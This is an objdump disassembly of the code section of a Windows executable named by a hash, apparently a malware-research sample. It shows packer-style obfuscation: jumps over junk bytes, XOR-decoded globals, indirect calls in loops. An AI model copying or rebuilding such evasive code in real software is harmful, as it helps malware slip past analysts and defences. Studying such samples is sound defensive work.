
d442043331919c4dcbc30bb4db10ba3f78a19ce84d5b466e150ce8e94dcc3ed3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x2c
  401006:	mov    ecx,DWORD PTR ds:0x4292e5
  40100c:	mov    eax,ds:0x4292f5
  401011:	sub    eax,ecx
  401013:	xor    ecx,DWORD PTR [ecx+eax*1]
  401016:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  40101d:	not    ecx
  40101f:	jmp    0x4010ec
  401024:	cdq    
  401025:	data16 cmc 
  401027:	push   edx
  401028:	push   ebp
  401029:	jge    0x4010a4
  40102b:	jge    0x401034
  40102d:	jmp    FWORD PTR [ebx-0x599b227b]
  401033:	out    dx,eax
  401034:	jl     0x4010b2
  401036:	jl     0x4010b4
  401038:	lods   al,BYTE PTR ds:[esi]
  401039:	jl     0x4010b7
  40103b:	jl     0x401009
  40103d:	(bad)  
  40103e:	xor    ecx,ebx
  401040:	xor    eax,0xcaddcfdb
  401045:	ja     0x4010bd
  401047:	or     ecx,DWORD PTR [edi]
  401049:	adc    al,0xa
  40104b:	(bad)  
  40104d:	bswap  edx
  40104f:	adc    dh,BYTE PTR [edi]
  401051:	sbb    bl,BYTE PTR [edi]
  401053:	mov    ch,0x52
  401055:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40105b:	rol    esp,cl
  40105d:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401064:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40106a:	out    dx,al
  40106b:	outs   dx,DWORD PTR ds:[esi]
  40106c:	add    ebx,DWORD PTR ds:0x4ac4729e
  401072:	mov    al,ds:0x36dd215b
  401077:	mov    eax,ds:0xa3c97380
  40107d:	je     0x4010b5
  40107f:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401085:	jecxz  0x4010c1
  401087:	and    ebp,0x4f
  40108a:	aam    0x94
  40108c:	dec    ebp
  40108d:	inc    DWORD PTR [edi-0x2f5a886e]
  401093:	mov    cl,0x41
  401095:	loope  0x4010bb
  401097:	pop    ecx
  401098:	sub    edi,DWORD PTR [eax-0x41639320]
  40109e:	jae    0x4010bd
  4010a0:	retf   
  4010a1:	cwde   
  4010a2:	sub    eax,0xc85ce3c6
  4010a7:	(bad)  
  4010a8:	mov    dl,0xfa
  4010aa:	loopne 0x401044
  4010ac:	cmp    eax,0xc76966cf
  4010b1:	sub    al,cl
  4010b3:	or     ch,dl
  4010b5:	sbb    eax,0xb39945d
  4010ba:	outs   dx,DWORD PTR ds:[esi]
  4010bb:	ins    DWORD PTR es:[edi],dx
  4010bc:	jb     0x4010c0
  4010be:	cmp    eax,0x22468cd1
  4010c3:	jns    0x401144
  4010c5:	cmp    al,0x8f
  4010c7:	add    bl,dl
  4010c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010ca:	add    edx,DWORD PTR [ebx+0x59]
  4010cd:	rol    esp,1
  4010cf:	add    eax,0x15d55edb
  4010d4:	jge    0x401072
  4010d6:	mov    ah,0x43
  4010d8:	daa    
  4010d9:	sbb    DWORD PTR [ebx],esp
  4010db:	addr16 and eax,0x4f3cdb10
  4010e1:	loop   0x4010b1
  4010e3:	xchg   esi,eax
  4010e4:	mov    ds:0x4b71944d,al
  4010ea:	(bad)  
  4010eb:	pop    ss
  4010ec:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4010f3:	mov    eax,0x9507
  4010f8:	add    DWORD PTR ds:0x427cf7,ecx
  4010fe:	jmp    0x4011cb
  401103:	leave  
  401104:	mov    bh,BYTE PTR [edi+esi*4-0x7536b24d]
  40110b:	pop    ebx
  40110c:	mov    dl,0x88
  40110e:	(bad)  
  40110f:	rol    BYTE PTR [edi+0x7caccdd5],1
  401115:	jl     0x401193
  401117:	lods   al,BYTE PTR ds:[esi]
  401118:	jl     0x401196
  40111a:	jl     0x4010c9
  40111c:	add    eax,0x3a7bafe
  401121:	push   eax
  401122:	sub    ah,BYTE PTR [edx+0x56362d]
  401128:	fistp  WORD PTR [ebx+0x76]
  40112b:	lods   al,BYTE PTR ds:[esi]
  40112c:	adc    al,0x6f
  40112e:	mul    DWORD PTR [ebx-0x66]
  401131:	and    DWORD PTR [ebx+edi*8],eax
  401134:	test   DWORD PTR [ecx+0x61562a4a],0xee899a5b
  40113e:	dec    DWORD PTR [edx]
  401140:	stos   DWORD PTR es:[edi],eax
  401141:	pop    es
  401142:	mov    eax,0xe8831f9d
  401147:	pop    ecx
  401148:	and    eax,0x144ee2fd
  40114d:	mov    edi,0xf630876d
  401152:	data16 jecxz 0x401174
  401155:	dec    esi
  401156:	test   eax,0xdff3849b
  40115b:	stc    
  40115c:	data16 sbb BYTE PTR [edi],0xc8
  401160:	pusha  
  401161:	loope  0x401124
  401163:	enter  0xfc8e,0x76
  401167:	add    al,0x6d
  401169:	fnstsw WORD PTR [ebp+0x42796392]
  40116f:	jbe    0x4011a8
  401171:	jno    0x40112e
  401173:	pop    edx
  401174:	or     DWORD PTR [esi+0x45],edx
  401177:	and    esp,esp
  401179:	jbe    0x4011d3
  40117b:	and    esi,DWORD PTR [esp+ecx*8]
  40117e:	popf   
  40117f:	rcl    DWORD PTR [ecx+0x6c],0xf1
  401183:	cmp    BYTE PTR cs:[edx-0x55],bl
  401187:	xchg   ebx,eax
  401188:	loopne 0x401204
  40118a:	inc    esi
  40118b:	stc    
  40118c:	test   DWORD PTR [ecx],0x51c3bfe9
  401192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401193:	mov    ds:0xec7ab64d,al
  401198:	jno    0x40119e
  40119a:	ins    BYTE PTR es:[edi],dx
  40119b:	mov    edx,0xbe04c43f
  4011a0:	push   cs
  4011a1:	pop    ss
  4011a2:	push   eax
  4011a3:	pop    edi
  4011a4:	stos   DWORD PTR es:[edi],eax
  4011a5:	pop    eax
  4011a6:	jge    0x4011ca
  4011a8:	cld    
  4011a9:	mov    ds:0x80483583,eax
  4011ae:	push   cs
  4011af:	arpl   dx,sp
  4011b1:	(bad)  
  4011b2:	sub    al,BYTE PTR ds:0xe5cff247
  4011b8:	shl    BYTE PTR [edx],0x8c
  4011bb:	imul   ebp,DWORD PTR [ecx],0x755edffe
  4011c1:	xlat   BYTE PTR ds:[ebx]
  4011c2:	xor    ecx,DWORD PTR [esi+0x5f]
  4011c5:	cmp    al,0xdb
  4011c7:	in     al,0x67
  4011c9:	hlt    
  4011ca:	dec    ecx
  4011cb:	mov    WORD PTR [ebp-0x4],ax
  4011cf:	lea    eax,[ebp-0x24]
  4011d2:	xor    DWORD PTR ds:0x4275a0,0x226
  4011dc:	mov    DWORD PTR [ebp-0x28],eax
  4011df:	not    DWORD PTR ds:0x4292b5
  4011e5:	mov    eax,DWORD PTR [ebp+0x8]
  4011e8:	movzx  ecx,BYTE PTR ds:0x4275a4
  4011ef:	adc    ecx,DWORD PTR ds:0x4292cd
  4011f5:	mov    DWORD PTR ds:0x4275a4,ecx
  4011fb:	mov    DWORD PTR [ebp-0x20],eax
  4011fe:	xor    DWORD PTR ds:0x42c89e,0x5a6f
  401208:	push   ebx
  401209:	sub    DWORD PTR ds:0x4275a0,ebx
  40120f:	lea    eax,[ebp-0x18]
  401212:	mov    DWORD PTR ds:0x4275ac,0x15
  40121c:	cmp    DWORD PTR ds:0x4275ac,0x0
  401223:	je     0x40124e
  401229:	cmp    DWORD PTR ds:0x4275ac,0x1b
  401230:	jne    0x40123c
  401236:	call   DWORD PTR ds:0x4279b7
  40123c:	mov    ebx,DWORD PTR ds:0x4275ac
  401242:	dec    ebx
  401243:	mov    DWORD PTR ds:0x4275ac,ebx
  401249:	jmp    0x40121c
  40124e:	mov    DWORD PTR [ebp-0x1c],eax
  401251:	movzx  ebx,WORD PTR ds:0x4292c5
  401258:	and    DWORD PTR ds:0x42c896,ebx
  40125e:	mov    eax,DWORD PTR [ebp-0x1c]
  401261:	mov    DWORD PTR ds:0x4292ad,0xc0c
  40126b:	push   esi
  40126c:	push   edi
  40126d:	or     edi,ecx
  40126f:	mov    edi,0xf89f2dad
  401274:	add    ebx,0x5343
  40127a:	mov    DWORD PTR [eax],edi
  40127c:	sub    ecx,DWORD PTR ds:0x427d1f
  401282:	mov    eax,DWORD PTR [ebp-0x14]
  401285:	add    DWORD PTR ds:0x4275a4,0x42c886
  40128f:	mov    ebx,DWORD PTR [ebp-0x8]
  401292:	mov    ecx,0x7510857
  401297:	sbb    DWORD PTR ds:0x427d03,ecx
  40129d:	xor    eax,ecx
  40129f:	mov    esi,0x32729e
  4012a4:	sub    DWORD PTR ds:0x4292b9,0x427cf7
  4012ae:	xor    ebx,ecx
  4012b0:	xor    edx,edx
  4012b2:	add    eax,esi
  4012b4:	adc    DWORD PTR ds:0x4292d5,0x427d07
  4012be:	jmp    0x40138b
  4012c3:	ror    BYTE PTR [edx],0x15
  4012c6:	std    
  4012c7:	std    
  4012c8:	std    
  4012c9:	fsubr  DWORD PTR ds:0xe0012c42
  4012cf:	mov    eax,ds:0xdcfc026f
  4012d4:	jg     0x401352
  4012d6:	jl     0x401284
  4012d8:	jl     0x401356
  4012da:	jl     0x4012fb
  4012dc:	out    0x1d,eax
  4012de:	cdq    
  4012df:	ins    DWORD PTR es:[edi],dx
  4012e0:	sbb    eax,0x5d18c1ae
  4012e5:	jo     0x401303
  4012e7:	sbb    edi,ebp
  4012e9:	pop    ebp
  4012ea:	cmp    BYTE PTR [ecx],0x7
  4012ed:	fadd   DWORD PTR [edx+0x1d]
  4012f0:	mov    WORD PTR [edi-0x45f64730],?
  4012f6:	mov    edx,0x65bcd191
  4012fb:	rcr    ecx,cl
  4012fd:	inc    esi
  4012fe:	or     DWORD PTR [eax+edi*1+0x4cb7aafc],edx
  401305:	push   DWORD PTR [esi+0x66]
  401308:	jno    0x401323
  40130a:	sbb    dh,BYTE PTR [ecx+eax*2+0x29]
  40130e:	xchg   edi,eax
  40130f:	test   eax,0x68f3afb7
  401314:	or     dl,bh
  401316:	inc    esp
  401317:	mov    dl,0x5e
  401319:	xlat   BYTE PTR ds:[ebx]
  40131a:	mov    eax,0xd8c07160
  40131f:	scas   al,BYTE PTR es:[edi]
  401320:	mov    bh,0x45
  401322:	js     0x4012de
  401324:	sub    eax,0xaf636f8c
  401329:	enter  0x5629,0x2e
  40132d:	xchg   edi,eax
  40132e:	test   BYTE PTR [eax-0x25c266aa],0xf0
  401335:	jmp    0x22b:0x62ec4b0a
  40133c:	dec    ecx
  40133d:	std    
  40133e:	stc    
  40133f:	xor    BYTE PTR [eax+0x55ad10e9],dl
  401345:	xor    al,0xbf
  401347:	cmp    dh,BYTE PTR [eax-0x5fd0484c]
  40134d:	sbb    BYTE PTR [eiz*8+0x5d4ba18d],dh
  401354:	add    eax,0x64b56bdf
  401359:	and    ecx,DWORD PTR [esi+0x23]
  40135c:	pop    eax
  40135d:	cs xchg ecx,eax
  40135f:	jle    0x40132f
  401361:	arpl   WORD PTR [ebx-0x1857e712],dx
  401367:	pop    edi
  401368:	xor    dh,BYTE PTR [edx-0x21]
  40136b:	repz push esp
  40136d:	pop    ecx
  40136e:	push   0x73e22558
  401373:	fwait
  401374:	mov    dl,0x2e
  401376:	imul   ebp,DWORD PTR ss:[eax-0x1a2293cf],0xffffffc0
  40137e:	dec    ebp
  40137f:	and    eax,0x38390f8e
  401384:	jmp    0x401398
  401386:	sbb    eax,0xb68bd6f4
  40138b:	add    ebx,esi
  40138d:	div    ebx
  40138f:	mov    edx,0x67cd
  401394:	mov    edx,DWORD PTR [ebp-0x20]
  401397:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  40139e:	jmp    0x40146b
  4013a3:	(bad)  
  4013a4:	mov    bl,ch
  4013a6:	nop
  4013a7:	jge    0x40140c
  4013a9:	jns    0x4013f5
  4013ab:	imul   edi,DWORD PTR [ecx+0x47663a1b],0x7e0c73e5
  4013b5:	jl     0x401433
  4013b7:	lods   al,BYTE PTR ds:[esi]
  4013b8:	jl     0x401436
  4013ba:	jl     0x4013e7
  4013bc:	mov    gs,WORD PTR [ebx+eax*8]
  4013bf:	test   BYTE PTR [eax+0x61a8c4f3],dh
  4013c5:	cmp    al,0x9f
  4013c7:	or     DWORD PTR [eax+eiz*8],0x70
  4013cb:	enter  0xe9eb,0xdf
  4013cf:	sar    ah,cl
  4013d1:	icebp  
  4013d2:	call   0xd58348d7
  4013d7:	inc    ebp
  4013d8:	mov    esp,0xb4c7a331
  4013dd:	retf   0xc483
  4013e0:	sub    ecx,DWORD PTR [edi]
  4013e2:	icebp  
  4013e3:	xor    ah,0x14
  4013e6:	push   0x55b3f283
  4013eb:	ins    DWORD PTR es:[edi],dx
  4013ec:	dec    ecx
  4013ed:	cdq    
  4013ee:	xchg   edx,eax
  4013ef:	mov    dh,0xb5
  4013f1:	pop    ss
  4013f2:	pop    ebx
  4013f3:	call   0x99fc:0xdde549b
  4013fa:	popf   
  4013fb:	pusha  
  4013fc:	push   edi
  4013fd:	and    ebx,DWORD PTR [esi-0x3f]
  401400:	jbe    0x401411
  401402:	rcl    DWORD PTR [ecx+edx*1+0x51],0x8a
  401407:	fs xchg ebx,eax
  401409:	loop   0x401419
  40140b:	push   cs
  40140c:	rcl    esi,0xee
  40140f:	push   ecx
  401410:	fcmovbe st,st(4)
  401412:	cmp    DWORD PTR [ebx],ebx
  401414:	and    eax,0x7a6709ed
  401419:	add    BYTE PTR [ecx+0x19],al
  40141c:	add    edx,DWORD PTR [eax-0x6c]
  40141f:	shl    DWORD PTR [eax+0x49],cl
  401422:	aaa    
  401423:	lods   eax,DWORD PTR ds:[esi]
  401424:	jecxz  0x4013b1
  401426:	mov    ebx,0x519f1035
  40142b:	sub    ch,ah
  40142d:	punpcklbw mm2,DWORD PTR [esi+ebx*2]
  401431:	mov    ch,0xd
  401433:	pop    esp
  401434:	add    BYTE PTR [edx],ch
  401436:	pop    edi
  401437:	(bad)  
  401438:	out    dx,eax
  401439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40143a:	push   eax
  40143b:	mov    ebp,0x8b4374ad
  401440:	inc    edi
  401441:	xor    ah,BYTE PTR [edi]
  401443:	pop    ecx
  401444:	add    DWORD PTR [edi],0xffffffbb
  401447:	je     0x401487
  401449:	jg     0x40140b
  40144b:	in     eax,dx
  40144c:	cmp    ah,BYTE PTR [eax]
  40144e:	adc    DWORD PTR [esi+0x5a],ecx
  401451:	or     ecx,DWORD PTR [esi]
  401453:	les    ebp,FWORD PTR [ecx-0x6c79e0e9]
  401459:	and    BYTE PTR [edi+0x22],al
  40145c:	lahf   
  40145d:	inc    ecx
  40145e:	sbb    ah,al
  401460:	test   BYTE PTR [eax+0x74],0x31
  401464:	jmp    0x7931b7c8
  401469:	mov    edi,0xc7023b7c
  40146e:	add    eax,0x427594
  401473:	jo     0x401486
  401475:	add    BYTE PTR [eax],al
  401477:	je     0x40195a
  40147d:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401484:	sub    DWORD PTR ds:0x42759c,edx
  40148a:	lea    eax,[ebp-0xc]
  40148d:	mov    DWORD PTR [ebp-0x10],eax
  401490:	sub    edx,eax
  401492:	mov    eax,DWORD PTR [ebp-0x10]
  401495:	not    edx
  401497:	mov    edx,DWORD PTR [eax]
  401499:	imul   edx,edx,0xf89ea9e0
  40149f:	mov    DWORD PTR ds:0x42c88a,0x7964
  4014a9:	mov    DWORD PTR [eax],edx
  4014ab:	mov    DWORD PTR ds:0x4292d9,0x7646
  4014b5:	mov    eax,DWORD PTR [ebp-0xc]
  4014b8:	cmp    eax,0x1fe34420
  4014bd:	mov    DWORD PTR ds:0x4292d5,0x4bbf
  4014c7:	je     0x401629
  4014cd:	and    ebx,0x6650
  4014d3:	jmp    0x4015a0
  4014d8:	cs scas eax,DWORD PTR es:[edi]
  4014da:	inc    ebp
  4014db:	add    eax,0xa36ee545
  4014e0:	sbb    DWORD PTR [edi+0x38d8e5e0],ebx
  4014e6:	imul   edx,ebx,0x7c7c7ebc
  4014ec:	lods   al,BYTE PTR ds:[esi]
  4014ed:	jl     0x40156b
  4014ef:	jl     0x40153d
  4014f1:	mov    ?,esi
  4014f3:	lods   eax,DWORD PTR ds:[esi]
  4014f4:	fdivr  DWORD PTR [eax]
  4014f6:	retf   0xe79b
  4014f9:	sbb    eax,0x4980b5d4
  4014fe:	sbb    BYTE PTR [eax],ch
  401500:	adc    esi,DWORD PTR [esi-0x137f9e21]
  401506:	popf   
  401507:	ret    0x65b8
  40150a:	ficomp DWORD PTR [edx-0x37]
  40150d:	inc    eax
  40150e:	dec    esp
  40150f:	inc    ecx
  401510:	iret   
  401511:	jo     0x40150e
  401513:	jnp    0x40152d
  401515:	ficom  WORD PTR [ecx-0x3ac2ee48]
  40151b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40151d:	push   ebx
  40151e:	mov    dl,0x26
  401520:	das    
  401521:	adc    al,0xc6
  401523:	data16 int3 
  401525:	sbb    eax,0xd18297ad
  40152a:	imul   esi,DWORD PTR [eax],0x7d287f28
  401530:	(bad)  
  401531:	xchg   edx,eax
  401532:	mov    ebx,0x7dcd2b46
  401537:	fst    DWORD PTR [esi+0x613d160f]
  40153d:	jo     0x4015b6
  40153f:	push   ecx
  401540:	cmp    eax,0xacc1be83
  401545:	sub    BYTE PTR [ebx+0x332bc020],dh
  40154b:	pop    esi
  40154c:	mov    bh,BYTE PTR [edx+0x4f]
  40154f:	ret    
  401550:	or     edi,ecx
  401552:	fimul  WORD PTR [ebp-0x1e9e4a4a]
  401558:	ins    DWORD PTR es:[edi],dx
  401559:	adc    edx,DWORD PTR [esi-0x51ce808b]
  40155f:	push   eax
  401560:	adc    BYTE PTR ds:0xa0e51551,bh
  401566:	out    dx,eax
  401567:	lahf   
  401568:	mov    edi,0xbb79e5a
  40156d:	sub    al,0xb8
  40156f:	add    esi,DWORD PTR [eax+eiz*8-0x2e]
  401573:	inc    ebx
  401574:	sbb    ecx,ebp
  401576:	test   eax,0x7c90e9cd
  40157b:	retf   
  40157c:	ror    DWORD PTR [ebx],1
  40157e:	xchg   ebx,eax
  40157f:	pop    edi
  401580:	pop    ss
  401581:	dec    edi
  401582:	mov    DWORD PTR ds:0xde0ad1d9,ebx
  401588:	or     ch,BYTE PTR [edi]
  40158a:	loop   0x4015ce
  40158c:	cwde   
  40158d:	mov    ebp,0x2f8fd6de
  401592:	mov    al,ds:0x9a5a90e8
  401597:	ret    
  401598:	ds leave 
  40159a:	adc    BYTE PTR [ebp+0x5151ccef],0x8b
  4015a1:	inc    ebp
  4015a2:	in     al,0x81
  4015a4:	or     BYTE PTR [eax-0x389f8ae4],dl
  4015aa:	add    eax,0x427598
  4015af:	adc    al,0x0
  4015b1:	add    BYTE PTR [eax],al
  4015b3:	cmp    DWORD PTR ds:0x427598,0x0
  4015ba:	je     0x40160a
  4015c0:	cmp    DWORD PTR ds:0x427598,0x6
  4015c7:	jne    0x4015d9
  4015cd:	push   DWORD PTR [ebp-0x1c]
  4015d0:	push   DWORD PTR [ebp-0xc]
  4015d3:	call   DWORD PTR ds:0x427c3f
  4015d9:	cmp    DWORD PTR ds:0x427598,0x7
  4015e0:	jne    0x4015f4
  4015e6:	xor    eax,eax
  4015e8:	xor    eax,DWORD PTR ds:0x427598
  4015ee:	dec    eax
  4015ef:	mov    ds:0x427598,eax
  4015f4:	mov    eax,ds:0x427598
  4015f9:	dec    eax
  4015fa:	mov    ds:0x427598,eax
  4015ff:	jmp    0x4015b3
  401604:	or     DWORD PTR ds:0x427594,edi
  40160a:	mov    eax,DWORD PTR [ebp-0x8]
  40160d:	mov    ebx,DWORD PTR ds:0x427d8c
  401613:	mov    edi,DWORD PTR ds:0x42c8de
  401619:	sub    edi,ebx
  40161b:	sub    ebx,DWORD PTR [ebx+edi*1]
  40161e:	xor    eax,ecx
  401620:	add    eax,esi
  401622:	pop    edi
  401623:	pop    esi
  401624:	pop    ebx
  401625:	leave  
  401626:	ret    0x4
  401629:	mov    eax,DWORD PTR [ebp-0xc]
  40162c:	add    eax,DWORD PTR [ebp-0x18]
  40162f:	cmp    eax,0x188271cd
  401634:	je     0x401648
  40163a:	mov    eax,DWORD PTR [ebp-0x10]
  40163d:	and    DWORD PTR [eax],0x751c9d
  401643:	jmp    0x4015a9
  401648:	mov    eax,DWORD PTR [ebp-0xc]
  40164b:	mov    edx,DWORD PTR [ebp-0x18]
  40164e:	or     eax,edx
  401650:	cmp    eax,0xffff6dad
  401655:	je     0x401669
  40165b:	mov    eax,DWORD PTR [ebp-0x10]
  40165e:	xor    DWORD PTR [eax],0x2650fa8f
  401664:	jmp    0x4015a9
  401669:	mov    ax,WORD PTR [ebp-0x4]
  40166d:	mov    edi,DWORD PTR [ebp+0x8]
  401670:	mov    edi,DWORD PTR [edi]
  401672:	mov    edx,0x8a42
  401677:	xor    ax,dx
  40167a:	mov    edx,0x3b08
  40167f:	add    ax,dx
  401682:	cmp    ax,WORD PTR [edi]
  401685:	je     0x401939
  40168b:	mov    eax,DWORD PTR [ebp-0x14]
  40168e:	xor    eax,ecx
  401690:	add    eax,esi
  401692:	mov    DWORD PTR [ebp-0x24],eax
  401695:	mov    eax,DWORD PTR [ebp-0x28]
  401698:	mov    di,WORD PTR [ebp-0x2c]
  40169c:	mov    ebx,0x8a42
  4016a1:	xor    di,bx
  4016a4:	jmp    0x401771
  4016a9:	pop    ebp
  4016aa:	and    ebx,DWORD PTR [ebp-0x65]
  4016ad:	jge    0x40172c
  4016af:	pop    ebp
  4016b0:	in     eax,0x36
  4016b2:	call   0x74a4:0x86b528ca
  4016b9:	in     al,dx
  4016ba:	jno    0x401738
  4016bc:	jl     0x40166a
  4016be:	jl     0x40173c
  4016c0:	jl     0x4016f6
  4016c2:	and    al,0x5f
  4016c4:	sbb    BYTE PTR es:[esi-0x3dca8e7a],0x4
  4016cc:	push   edx
  4016cd:	idiv   edx
  4016cf:	out    dx,eax
  4016d0:	nop
  4016d1:	in     eax,0x7d
  4016d3:	pushf  
  4016d4:	jne    0x4016c3
  4016d6:	and    eax,0x4ceb281d
  4016db:	cmp    edx,esi
  4016dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016de:	pop    es
  4016df:	cs jecxz 0x401734
  4016e2:	imul   ebx,DWORD PTR [eax+eiz*8-0x498f3633],0x3b
  4016ea:	pop    eax
  4016eb:	cdq    
  4016ec:	sbb    ecx,0x1f
  4016ef:	mov    edx,0x1346e3a0
  4016f4:	into   
  4016f5:	push   edi
  4016f6:	rcl    ebx,1
  4016f8:	jecxz  0x401773
  4016fa:	and    DWORD PTR [edi-0x3b],eax
  4016fd:	add    eax,0xbc5d88f6
  401702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401703:	(bad)  
  401705:	jae    0x401705
  401707:	xchg   esp,eax
  401708:	sbb    DWORD PTR [ebp+0x4c],eax
  40170b:	dec    esi
  40170c:	aad    0x66
  40170e:	(bad)  
  40170f:	and    ch,BYTE PTR [edi+0x78]
  401712:	and    eax,0x17dc98c2
  401717:	pop    esp
  401718:	adc    eax,0xf540abe3
  40171d:	xor    DWORD PTR [ecx],0x2e
  401720:	pop    ebx
  401721:	mov    eax,0x787a8b22
  401726:	jns    0x401777
  401728:	stos   BYTE PTR es:[edi],al
  401729:	pop    ebp
  40172a:	mov    BYTE PTR [edi],cl
  40172c:	dec    esp
  40172d:	pusha  
  40172e:	retf   0xbce3
  401731:	leave  
  401732:	pop    es
  401733:	adc    eax,0xd3a662dc
  401738:	sbb    eax,ebp
  40173a:	sbb    DWORD PTR [eax],ebp
  40173c:	ins    DWORD PTR es:[edi],dx
  40173d:	scas   ax,WORD PTR es:[edi]
  40173f:	jb     0x40173e
  401741:	cld    
  401742:	in     eax,dx
  401743:	and    cl,BYTE PTR [ebx-0x3d85ef6d]
  401749:	loope  0x401747
  40174b:	into   
  40174c:	jecxz  0x4017a4
  40174e:	fcom   DWORD PTR [ebx-0x13]
  401751:	cld    
  401752:	jl     0x4016db
  401754:	jns    0x4017a1
  401756:	mov    ds:0x57baa5d9,al
  40175b:	in     eax,0xa7
  40175d:	aad    0xa1
  40175f:	mov    fs,WORD PTR [edi+0x68]
  401762:	imul   ecx,DWORD PTR [ebp-0x4d],0x3
  401766:	push   ecx
  401767:	es pop esp
  401769:	in     al,0x76
  40176b:	fs (bad) 
  40176e:	neg    BYTE PTR [edx]
  401770:	scas   eax,DWORD PTR es:[edi]
  401771:	add    di,dx
  401774:	movzx  edx,di
  401777:	mov    edi,DWORD PTR [ebp-0x8]
  40177a:	jmp    0x401847
  40177f:	repz shl DWORD PTR [edx+0x55456240],cl
  401786:	jecxz  0x401791
  401788:	push   cs
  401789:	scas   eax,DWORD PTR es:[edi]
  40178a:	rcr    bl,1
  40178c:	popf   
  40178d:	rcr    DWORD PTR [ebp+0x1c],cl
  401790:	jo     0x40180e
  401792:	jl     0x401740
  401794:	jl     0x401812
  401796:	jl     0x401793
  401798:	pop    eax
  401799:	dec    edi
  40179a:	or     eax,ebx
  40179c:	call   0x887cb1a5
  4017a1:	pop    edi
  4017a2:	adc    BYTE PTR [eax],0xb2
  4017a5:	jmp    0xe3f1:0x5f6922a2
  4017ac:	lea    esp,[ecx-0x15]
  4017af:	push   edi
  4017b0:	(bad)  [ebp+0x1e119213]
  4017b6:	retf   
  4017b7:	aad    0x49
  4017b9:	ins    DWORD PTR es:[edi],dx
  4017ba:	mov    DWORD PTR [ecx],eax
  4017bc:	pushf  
  4017bd:	cmp    DWORD PTR [ebx-0x26],0x22
  4017c1:	push   edx
  4017c2:	add    ah,bh
  4017c4:	sbb    cl,al
  4017c6:	neg    DWORD PTR [edi-0x2570b142]
  4017cc:	xor    esp,edi
  4017ce:	or     cl,dl
  4017d0:	outs   dx,DWORD PTR ds:[esi]
  4017d1:	inc    esi
  4017d2:	or     BYTE PTR [esi],dh
  4017d4:	push   0xffffffe9
  4017d6:	xchg   edi,eax
  4017d7:	or     eax,0x3e546de9
  4017dc:	push   ebp
  4017dd:	pop    ebp
  4017de:	jne    0x401777
  4017e0:	jmp    0x68e2:0x3d07fd7c
  4017e7:	stos   BYTE PTR es:[edi],al
  4017e8:	ror    ebp,0xa3
  4017eb:	es add al,0x3c
  4017ee:	adc    esi,ebx
  4017f0:	dec    ebx
  4017f1:	sbb    al,0xab
  4017f3:	loop   0x40177a
  4017f5:	push   es
  4017f6:	lods   eax,DWORD PTR ds:[esi]
  4017f7:	and    BYTE PTR [ecx+eax*1],ch
  4017fa:	arpl   WORD PTR [ecx],bx
  4017fc:	push   0xa09ace64
  401801:	mov    WORD PTR [ecx-0x6745d548],fs
  401807:	push   ebx
  401808:	mov    ecx,0xc6624e64
  40180d:	cmp    eax,0x876445dd
  401812:	push   ds
  401813:	int    0x10
  401815:	out    dx,al
  401816:	in     al,0xdd
  401818:	iret   
  401819:	lds    ebp,FWORD PTR [ebx+0x4b]
  40181c:	adc    dh,BYTE PTR [esi+0x20b046c3]
  401822:	shl    ch,1
  401824:	neg    DWORD PTR [eax]
  401826:	sub    eax,0x3bd9b3f1
  40182b:	lds    edi,FWORD PTR [eax+0x63c713dc]
  401831:	out    dx,al
  401832:	mov    ecx,0x1d768b65
  401837:	dec    ebx
  401838:	fdiv   DWORD PTR ss:[eax+0x48]
  40183c:	sbb    dh,0x9e
  40183f:	inc    edx
  401840:	and    esp,ebx
  401842:	div    DWORD PTR [ebx+0x33815317]
  401848:	stc    
  401849:	lea    edx,[edx+edi*1+0x32729e]
  401850:	add    DWORD PTR [eax],edx
  401852:	mov    eax,DWORD PTR [ebp-0x20]
  401855:	mov    edx,DWORD PTR [ebp-0x8]
  401858:	mov    edi,DWORD PTR [ebp-0x24]
  40185b:	xor    edx,ecx
  40185d:	add    edx,esi
  40185f:	imul   edx,edi
  401862:	sub    DWORD PTR [eax],edx
  401864:	jmp    0x401931
  401869:	pop    ebx
  40186a:	jno    0x401829
  40186c:	loope  0x4018eb
  40186e:	jge    0x4018cb
  401870:	lods   eax,DWORD PTR ds:[esi]
  401871:	xlat   BYTE PTR ds:[ebx]
  401872:	mov    bh,0x47
  401874:	jns    0x401899
  401876:	arpl   ax,dx
  401878:	push   eax
  401879:	dec    esp
  40187a:	jo     0x4018f8
  40187c:	jl     0x40182a
  40187e:	jl     0x4018fc
  401880:	jl     0x401820
  401882:	add    BYTE PTR [ebx+0x7bcedca9],bh
  401888:	std    
  401889:	adc    DWORD PTR [esi-0x4d],0x7
  40188d:	mov    al,0x52
  40188f:	dec    edi
  401890:	fwait
  401891:	jmp    0x696a7a8e
  401896:	das    
  401897:	aas    
  401898:	jae    0x4018c4
  40189a:	or     eax,0xe5cdeb48
  40189f:	int    0x97
  4018a1:	adc    edi,edx
  4018a3:	push   esp
  4018a4:	jne    0x4018ea
  4018a6:	stos   DWORD PTR es:[edi],eax
  4018a7:	push   ecx
  4018a8:	mov    esi,0xd76a7271
  4018ad:	dec    edx
  4018ae:	add    al,0x79
  4018b0:	sbb    eax,0x170c3e3
  4018b5:	int    0x4
  4018b7:	cld    
  4018b8:	dec    eax
  4018b9:	jg     0x4018b2
  4018bb:	xor    edi,edi
  4018bd:	inc    ebp
  4018be:	add    DWORD PTR [ecx+0x2578f77d],0x459e49c2
  4018c8:	mov    dh,0x12
  4018ca:	sahf   
  4018cb:	outs   dx,DWORD PTR ds:[esi]
  4018cc:	push   0xffffffba
  4018ce:	add    esi,DWORD PTR [ecx+0x37]
  4018d1:	ds retf 
  4018d3:	in     al,dx
  4018d4:	cwde   
  4018d5:	ss push edi
  4018d7:	push   es
  4018d8:	(bad)  
  4018da:	nop
  4018db:	jo     0x4018bd
